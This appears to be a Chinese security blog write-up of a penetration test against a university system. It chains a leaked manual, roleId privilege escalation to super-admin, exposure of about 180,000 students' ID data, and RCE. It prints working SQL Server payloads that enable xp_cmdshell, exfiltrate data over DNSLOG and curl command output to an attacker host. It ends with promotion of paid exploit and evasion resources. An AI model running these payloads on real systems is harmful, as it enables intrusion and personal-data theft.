#  一份文档引发的连锁漏洞、从一个文档到全校三要素泄露和RCE  
byname
                    byname  渗透安全HackTwo   2026-04-19 04:22  
  
**0x01 简介**  
  
**某 211 高校业务系统的一次完整渗透测试。攻击者从系统公开的操作手册文档中获取关键账号规则，成功登录普通学生账号；随后通过修改角色 ID 实现垂直越权，新建管理员账号并进入后台，进一步构造数据包提权至超级管理员，获取全校近 18 万学生三要素信息。最终在报表 SQL 编辑功能点利用 SQL Server 特性执行 xp_cmdshell，成功实现 RCE，完成从信息泄露到服务器控制的完整攻击链。**  
> 本文仅用于技术学习与合规交流，严禁非法滥用。  
因违规使用产生的一切后果，由使用者自行承担，与作者无关。  
  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo“设为星标”，否则可能就看不到了啦！**  
  
参考文章  
：  
  
```
https://xz.aliyun.com/news/91869
https://www.hacktwohub.com/
```  
  
  
**末尾可领取挖洞资料/加圈子 #渗透安全HackTwo**  
  
**0x02 正文详情**  
  
一个非同寻常的信息泄露  
  
开局一个登录框：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAV1XCYoJ74KvGvkLxXA5ia8shWhqdc0HUbBvXpepIEGXVAGZZiaeG3NqwqDYibiaDibP1Ot0AsZYd42CmwAGeIVkvxtk8rRyInkY9vk/640?wx_fmt=png&from=appmsg "")  
  
右下角有一个"点击查看操作手册"就很显眼，让人很有想点击的欲望。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUaKMicpUiaicKmm3BEicwEJpAZKaQQEGRCzlLUia3b2zJGJ3DqgNezZZxxbibUAlhjjFPibiaENccWutOibd64bVHOWfIJbTib7DQMwBs9w/640?wx_fmt=png&from=appmsg "")  
  
现在了然了账号和密码的默认格式，于是便很兴奋地谷歌尝试搜索**site:xxx.edu.cn filetype:pdf 学号**  
的相应信息，但一无所获。  
  
又去看看网站的前端代码，测测SQL注入，插件找一波接口...同样很正常地没用任何进展。  
  
正当感到无计可施，想要切换下一个站点之际，一不小心又点进了刚才的"操作手册.doc"文档，然后随便地往下翻动：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAXeg5BIc18qTTU2QlUFdcTJiadYjKmlebDgn2qsibtGShlPtJxI7Xq1BiaicPFqLicLuUvLxuyy8WJKwxx2BbXmk7bJuJVjvzpq7hp4/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXIXOAicfUpfMpMoDdvVN7wZmUH1iaWHNHMJ6c4KUxkleRCrPBrHMs5gmiaORyx5S6mYF51CqkYsoZfmxPbDOIDqg8sgw0fIic1bpc/640?wx_fmt=png&from=appmsg "")  
  
除却姓名学号这种每个学校的文件都随处可见的信息，敏感信息都打上了  
🐎  
，不得不说，二幺幺高校就是不一样，安全意识确实做得很到位。  
  
...  
  
不对，好像掠过去了什么东西？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAX6d4zXh9wibJFuxhDpwte22MOjRHA0sIEcoCaMBxaibhdQ2sYfF0PrKZ6csszIut7fBqQX0pM85hibU8n8XsdGlPAC4g3F8HE1mY/640?wx_fmt=png&from=appmsg "")  
  
  
利用泄露出来的学生信息成功登录！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWs7mhIxSqMP5Y9ymAYIhwcmkWKDdWOxm2zX0ZCSa6VPQKnWwiamZBrBnnCpATicpWdWF8JRrUVTBFMdleASmm6f6dJoibwGiahWFk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUiaZxFKx9cCvicCNAlOwI7g6y1dmYWZEiae6VAVVicRmCqjhblALRaMLQhiasH7lmBPzulEn9smicfzfMuGcDhClbA4lj2ucZEsKjHg/640?wx_fmt=png&from=appmsg "")  
  
然后就可以愉快地测试了^^  
# 初步测试  
## 垂直越权  
  
返回登录框，抓包。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAVbRm8pia4n7Vuo8kTWRy4nQ7J6QqbGPfv4yia6FxTtnQtpZmnpLSL98HUrPItNOibvqXMk99Sx3Fv1nDhzk0TrllIYpZEfserJdI/640?wx_fmt=png&from=appmsg "")  
  
经典roleId，常用来表示用户权限。也可以翻下前端找一下哪个数字代表哪个权限，这里就懒得翻了。  
  
一般数字越小权限越大，这里直接改成1。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWCjXvlzuayXg9QByJHXKLSK8b3YABNslcuDzPNbgRlTd3IambwAibibTQAb8Jas0TcWDoYtbFQictwbvGkTO5bvoibybDKqibTsTjY/640?wx_fmt=png&from=appmsg "")  
  
提示用户不存在。  
  
也就是where roleId=1没有查到，鉴权做得很棒啊！  
  
试试改成2呢：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUmENpXOib8y4RTu0nzyKw4uspuKkrOyLm1KzMIuBmD6fYzavIVMKl4RribgX4ckibGCKPnhjMRARqx2pZQUfmgSwicd5ELow8YI7s/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAVlQeb6DDNwVGMkNwKecTtWSxGueCRic0oJiaiavlV8TLNS2iaqTiacdzWO1NezNrVUXe2dibg6XwId8UuNic7WXQjxiaUk1ibIy5Xjlng4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUzv30OA68dGfHK5tr1dNTla1Y9J4V26lDP4T2JUa063eCNib5REDKddyB1DlOZVU7eKLgwdNJxf7cu5QqKFLNZ6bTN3snaqEYg/640?wx_fmt=png&from=appmsg "")  
  
  
新增成功！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUCSzDGEcTQDDZHiawiacUZFAGicgBqsKQRTLpjmRF6LHF7CC1AfS23XiaK0ickq8y6aUFeQW9ljrOkCKibJGVVeBroI1N7m444JlNDo/640?wx_fmt=png&from=appmsg "")  
  
新增一个管理员账户，回看前端登录的样式知道肯定学生用户和管理员后台登录是分开的，那么下一步便是寻找登录接口。  
  
看一眼Findsomething插件，刚好存在一个/loginadmin的接口。  
  
拼接一下url，成功得到管理员后台登录入口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAXZVB4573jbz813Q7yeMA7NGicsQSdrQtYohxtzO3kTNicf5pI6LMZ5I5Kia30y4cXqtk5oH22xR66SRa7n2ibnsswSGR3U840vhH8/640?wx_fmt=png&from=appmsg "")  
  
登录刚刚新建的管理员账号：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWrGDkHeqAYib2XOvoj5DvftbkE4dtNmTO0iblgj5ic41URBekx0g1uLVic5bBTsx7hsic9pWYBFALWsVsstMlJZDG8SBtxYOEnp0mI/640?wx_fmt=png&from=appmsg "")  
  
这里能看的东西就挺多了，在申请记录里存在大量学生申请的含有敏感信息的文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWCG76olZ7UpqicTpX99onlabWA7I3Xeib4tc9hQYa9SCt0ibicfZGn9BRevQ2HiaVmDGHyz92r7YEEbTM59UZznMicd0tAs3VfIhF04/640?wx_fmt=png&from=appmsg "")  
  
还能修改申请文件、印章的收费：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAW0hVbbmYsIibsV6ibNic0EHxhiciaevf3ciaJgjuU51FpdPZKkxPD1p4phkOFnWtNylSj8E6SI1GQOIqW9kthSYh6sqswrAwy5uleLE/640?wx_fmt=png&from=appmsg "")  
## 一些踩坑  
  
一个普通的账号常见的还有水平越权，比如对于这种情况下的学生账号，可以请求文件时抓包看看请求的参数是否可控，就可以通过修改参数如学号去查看其他人的敏感文件。  
  
这是一个请求文件的数据包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUrEOicpbgBslrpbzVa1vHSxH1R6icdgbg3owZuXLKJtgicwSbd5oHFtSYGEFRfnTl4O4YiaBUM5icrkx4s137qTIqQXVp5sj3D2Azs/640?wx_fmt=png&from=appmsg "")  
  
有一个X-Authorization字段，解码可知是JWT验证，记录了user信息包括学号等，极大概率是控制返回文件的字段；userId为学号，修改后发包无果。  
  
因为又没抓到其它有有效内容的返回包，所有的参数只有可能是从前端传出，便有些突发奇想尝试一下：也许这个fileProperty是这里控制返回文件的参数，比如是通过一些加密算法将学号加密成这样的形式，只要我能逆向定位到加密JS，用其它的学号加密然后发包就能越权看到其它人的文件。  
  
于是开始了漫长的JS逆向之路，由于网站前端是webpack打包，还去学习了一下相应的逆向技术。  
  
后面才想起，坏了，这好像是UUID。。。它是数据库后端生成的而非前端加密学号生成的。。。  
  
它之所以不在接口的返回包出现，是因为这里的UUID就像表单CSRF-Token一样，从一开始登录就自动附着在html元素之中了。  
# 越权超级管理员  
  
借用管理员权限测试时，某些特殊功能还是会弹出一个权限不足的提示，比如改变邮箱模块等等。  
  
于是猜测到这个站点还应该存在一个超级管理员权限。  
  
只是回头看之前添加用户的功能点：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAX0ZLFibSc8m5N5DtSZtDxB6ibabHPHwKGnAkEV7yZs8bv3j8XURsCSFA2RxicicCiaian91QlfXcLASIic5yfuMnNAicZ1dHu3x2NsUSU/640?wx_fmt=png&from=appmsg "")  
  
网站是对添加超级管理员这个功能进行限制了的。  
  
但是结合之前测得的这个网站的特性，添加一个任意账号，抓包看添加用户的数据包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWu273SVPdHlo0R9xd5PA612LZmdyaU9rmS3lq6ib4OUMxH9UxXEOOib1UcM9oZnWjj5CKZDbgKzRtkV8s0zWG9bdGjt6Zgia7Dkw/640?wx_fmt=png&from=appmsg "")  
  
修改roleIds参数为1。  
  
添加成功！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAU0VkxroFY0vP6Hy16mictuMa5R4UKibbok6CsJTcO6eY4EKwC1p5KictZ98sL2BsaCLdkZJDyh6GhI2JOR1ia24rSNPlNibGOXooXY/640?wx_fmt=png&from=appmsg "")  
  
  
切回管理员登录接口，登录该账号：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWicBTia46aMbViaaiaZV4ibDsOBctrG7Lf9OF8dYdotnL2LKbRiarKdshD4tZZQfQWWgiavW22nCRqCxU3ghNORibBcXVoSiaRdzMNXKIs/640?wx_fmt=png&from=appmsg "")  
  
菜单的功能又多出了很多，其中，在某个菜单下，**暴露了该校所有18w学生的sfz号码！**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUicV8k8ysbb2p0zhyQ58FSZkS57sjuMuV0qrkgKOaL4F6tAiaU6X7mEgibgYVJbwsoOKK3ZcVaHEnE7hiaWYpMC0yjGYrsLKQY0ic0/640?wx_fmt=png&from=appmsg "")  
# RCE  
  
深入每个功能都测了测，也得到了其它的一些敏感数据，但是大多却没什么用。  
  
难道就止步于此了吗。。  
  
都拿到了超管权限，信息泄露只是苟且，RCE才是梦想。  
  
终于在茫茫多的功能中找到了一个很特殊的地方：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAU2sxB5LKxfwKSDy4vv8G01AZ7hHIbRlZeFUwsQrbK5ugHnP6niba30p0qUS7bqiagH9Z66XTUCVJBPEPaFBKHibleady5ic9xbeicg/640?wx_fmt=png&from=appmsg "")  
  
可以编辑SQL语句。  
  
且看文件名称，与学生用户端前台的"文件请求"一致：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAX3PQnhdNvOq45eG5dkYiaZPYzKlAyLysN9p6uSjPduvM4hW1xchp94jBEbPGFWEGtf6l4bbp5iaKzq1dzLI4HApXW6SI8p3aXicI/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAX4k4yhWeVUkXMZqZ5EmRFicMNVgYON6dqYOJRfhTJ0JISbQjOKwmzsWEcput5YAqIfVJKshQPbgarPF4P6gFE8pkqa4lS4FTas/640?wx_fmt=png&from=appmsg "")  
  
那么便很容易猜测，前台用户每点击一次文件，后端就肯定会执行一下所谓"报表SQL""菜单SQL"的语句并返回结果。  
  
如果是这样的话，添加些恶意的SQL，比如外带数据库名等等，可能也会回显到得到的文件里。  
  
不多说，开始测试。  
  
由于这个网站的用户量还挺大，为了不影响学校网站的正常运行便拉着一个访问量最小的文件类型进行尝试。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXFczRcib5HyQk7gkDa1R5nWmtgxLMqFJFLFHuIOczob2MXop6HxGNfShWmYseFUnFbuF2pP3jl12RFQMRRiaDd0XgebcGEQwPFg/640?wx_fmt=png&from=appmsg "")  
  
  
这一试花费的时间可就太多了，也遇到了挺多问题：  
  
这个网站的报表SQL、菜单SQL还有前端都有牵连，字段甚至语法都不能弄错，否则很容易就会出问题，执行不了一点。  
  
更让测试受阻的是每个用户申请文件，如果申请成功(但大多数时候数据库名都不会回显到文件里)，**网站都会对申请到的文件进行缓存**  
，并沿用上一次SQL请求的返回结果，意味着我的每一次尝试都可能要换一个新的账户(只能说还好之前获取的账号很多).......  
  
终于，尝试了无数个payload，终于外带了一次数据：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAXBFf5DYuh9B0sxlDfMhnVzP6uybXBULc84SibRs6ZAnPSc15vWRBVFNAFNxzP6OHBA6NmFM0fU2Zib3NnZZ1Arnq9Lyce93dCbQ/640?wx_fmt=png&from=appmsg "")  
```
SELECT xb
FROM dbo.cxsyxm a
LEFT JOIN z_V_xsjbxxb b ON a.xh = b.xh
WHERE a.xh = '学号' AND a.rn = '选中值' 
UNION 
SELECT db_name(); 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAVticeOA5ibGETSqr0lLAPQUSDjwDKt4qyYTokYVh8oArL9du6VBaJ75vL0bDVj5ppQ0fiaDmayODo3RbvaCAlYBH0jocrx8uMEfA/640?wx_fmt=png&from=appmsg "")  
  
在测试的过程中也知道了该数据库语法为SQL Server。  
  
既然是SQL Server，而且是整段语句的完整传入，那么我们完全可以用SQL Server的**exec xp_cmdshell**  
来命令执行。  
  
那么此时便可以新建一个test文件，先试试**DNSLOG外带**  
数据库名，来测试目标服务器是否出网：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUn1GWpORQKcROxWY0I1yOzjvuB9gUcn6zHwgRnHoycFFglMWeLiaE4Ib15vSlVibFy7Exr4FIxf9j77qWjmQk0f7tHGUuyzFp5s/640?wx_fmt=png&from=appmsg "")  
```
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;
DECLARE @dbName NVARCHAR(128);
DECLARE @cmd NVARCHAR(400);
SET @dbName = DB_NAME();
SET @cmd = 'ping ' + @dbName + '.ch85c4.dnslog.cn';
EXEC xp_cmdshell @cmd;
```  
  
登录学生账号请求对应文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVuVXiakibA2iaIaK1AiaDzdKNcGp1R9IajwGMdEveoMt9Qlg7QnHscg9cWJu9Q7wkOtohqV8mjLltZK23Hahezw1tr7o9yalENFP0/640?wx_fmt=png&from=appmsg "")  
  
此时查看DNSLOG的解析记录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVVbvZH9X9Q8B1iaxEeqicxlWam5icukDUibUwGOaVKtmHXp6jrHjyevRCzGaUoypEYGkxLLybzFR3PXI5L7Gj1l0RvpGyXyl6Yn8k/640?wx_fmt=png&from=appmsg "")  
  
  
成功将数据库名带出！  
  
那么接下来便是想要执行命令，这里便有一个踩坑：  
  
**由于在超管权限下看到的系统管理菜单处是LINUX系统**  
：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUnPeyeQLr5xrd1OR9hDuXnSH8cOIqJXotTjicEmUM8N8DicLQcwKSK43FprTUiadnTqF3e6ck3W6tL455xKoHVDyHuibUASawSj34/640?wx_fmt=png&from=appmsg "")  
  
  
所以便一直进行LINUX的命令执行，像是ls之类的命令。  
  
后续再测试执行**windows命令**  
才成功执行，此时才反应过来这套系统是典型的**站库分离**  
，即**WEB服务系统主机和数据库主机是分离开的**  
。  
  
那么修改SQL语句为执行dir命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUn1c52DDku0jvZNNiaCqRibAibgZNVCIeRJ1WHbZGrX2as9YhkKwVWiajpjuh7ojPk1Yk8dIicXqXnOLRaPR8z4EWjhia3pw21jSAGU/640?wx_fmt=png&from=appmsg "")  
```
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;
EXEC xp_cmdshell 'dir 2>&1 | curl -X POST --data @- http://ip:port ';
```  
  
成功在VPS上获得命令回显：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUrwnEAjKQ7QSfzbNx8EiaNVtee4UUrZ4SYJN1f6RTW9l0l7ehOFmJpoqZHgsW2ONkbeTluZOLAc7wdjXcHUNlu71HKfFe1Npx0/640?wx_fmt=png&from=appmsg "")  
  
  
**0x03 总结**  
  
挖本以为只是份平平无奇的操作手册，没成想直接给渗透开了挂。顺着文档线索登录学生账号，一路越权干到超管，涉及严重安全问题的 18w 学生三要素。最后更是在 SQL 编辑页面一发入魂，直接拿下 RCE。一份小文档，炸穿整个系统，高校安全真是细节藏魔鬼啊。最后**愿各位师傅在后续挖洞之路中，精准定位漏洞、高效挖掘，天天出高危、次次有收获，挖洞顺利、不踩坑、多拿奖励，共同提升支付业务安全测试能力！**  
🔥  
喜欢这类文章或挖掘SRC技巧文章师傅可以点赞转发支持一下谢谢！  
  
  
**内部星球VIP介绍V1.4（更多未公开挖洞技术欢迎加入星球）**  
  
  
**如果你想学习更多另类渗透SRC挖洞技术/攻防/免杀/应急溯源/赏金赚取/工作内推，欢迎加入我们内部星球可获得内部工具字典和享受内部资源/内部群🔥**  
  
🚀  
1.每周更新1day/0day漏洞刷分上分，目前已更新至5394+;  
  
🧰  
2.包含网上的各种付费工具/各种Burp  
漏洞检测插件  
/  
fuzz字典  
等等;  
  
🧩  
3.Fofa/  
Hunter  
/Ctfshow/  
360Quake  
/Shadon/零零信安/  
Zoomeye  
各种账号高级VIP会员共享等等;  
  
🎥  
4.最新SRC挖洞文库/红队/代审/免杀/逆向视频资源等等;  
  
🧪  
5.内部自动化漏扫赚赏金捡洞工具，免杀CS/Webshell工具等等;  
  
💡  
6.漏洞  
报告文库  
、  
共享SRC漏洞报告学习挖洞技巧；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXlS5Ps3iaElYXHLB5ZaEDWKA9A5R904X9QL787kOicCVCnvVG4paibTtkWonIeXM1QW6PWKEXUCIsv4JcnpGoREHicibWibVu9bH70I/640?wx_fmt=png&from=appmsg "")  
  
🎯  
6.最新0Day1Day漏洞POC/EXP分享地址（同步更新）;  
  
https://t.zsxq.com/8IDY4  
(全网最新最完整的漏洞库)  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVZmmFwC3xsticJNjPLiaBs7IROImYZKrBjqGxuz0sDaeHG37Td9gIiboSUCQcXWQkpDzlDgiblA7CFTyvNXGD5eiaTj6BN3GLnHMp0/640?wx_fmt=png&from=appmsg "")  
  
🔥  
7.详情直接点击下方链接进入了解，后台回复"   
星球  
 "获取优惠先到先得！后续资源会更丰富在加入还是低价！（即将涨价）以上仅介绍部分内容还没完！**点击下方地址全面了解👇🏻**  
  
  
**👉****点击了解加入-->>2026内部VIP星球福利介绍V1.5版本-1day/0day漏洞库及内部资源更新**  
  
  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**  
" 获取 一些字典已重新划分处理**（需要内部专属fuzz字典可加入星球获取，内部字典多年积累整理好用！持续整理中！）**  
  
回复“**书籍**  
" 获取 网络安全相关经典书籍电子版pdf  
  
# 最后必看  
  
  
      
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
  
  
# 往期推荐  
  
  
**1.内部VIP知识星球福利介绍V1.5版本0day推送**  
  
**2.最新Nessus2026.2.9版本下载**  
  
**3.最新BurpSuite2026.1.1专业版下载**  
  
**4.最新xray1.9.11高级版下载Windows/Linux**  
  
**5.最新HCL AppScan_Standard_10.9.1下载**  
  
渗透安全HackTwo  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
上一篇文章：  
[Nacos配置文件攻防思路总结|揭秘Nacos被低估的攻击面](https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247492839&idx=1&sn=b6f091114fbd8e8922153a996c8f4f1c&scene=21#wechat_redirect)  
  
  
喜欢的师傅可以点赞转发支持一下  
  
